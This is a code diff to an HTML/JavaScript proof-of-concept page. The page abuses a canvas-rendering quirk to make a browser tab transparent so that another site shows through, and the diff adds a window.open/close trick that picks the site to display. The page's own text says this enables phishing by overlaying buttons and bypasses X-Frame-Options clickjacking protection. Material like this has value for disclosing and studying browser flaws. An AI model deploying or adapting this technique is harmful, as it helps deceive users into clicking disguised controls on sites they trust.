@@ -34,7 +34,7 @@
         }
     </style>
     <canvas></canvas>
-    <span>Instructions:<br>1. Leave this site open in a tab<br>2. Go to another tab with any website on it<br>3. Come back to this tab<br>If it doesn't work, start again</span>
+    <span></span>
     <script>
         var canvas = document.querySelector('canvas')
         ctx = canvas.getContext('2d', { alpha: false })
@@ -48,14 +48,21 @@
                     setInterval(function () {
                         //must clearrect a canvas with alpha set to false in the getContext at a high rate (this is 60fps)
                         //the website isn't drawn to the canvas, but the current tab is made transparent so that the previous page is shown.
+                        //by quickly opening and closing a tab, I can choose the previous page shown. 
                         ctx.clearRect(0, 0, canvas.width, canvas.height)
                     }, 1000 / 60)
                     canvas.style.display = 'inline-block'
-                    document.querySelector('span').textContent = "This isn't able to read the webpage but can be used for phishing attacks by placing buttons on top of areas where buttons are known to be."
+                    document.querySelector('span').textContent = "This isn't able to read the webpage but can be used for phishing attacks by placing buttons on top of areas where buttons are known to be. Functionally the same as an iframe you can't interact with, but this bypasses the X-Frames-Options header."
                     drawing = true
                 }
             }
         })
+        //temporarily open tab
+        var w = window.open('http://github.com')
+        setTimeout(function(){
+            w.close()
+            //doesn't work for certain websites, but the window.open still does and the content is still mirrored
+        },100)
     </script>
 </body>
 
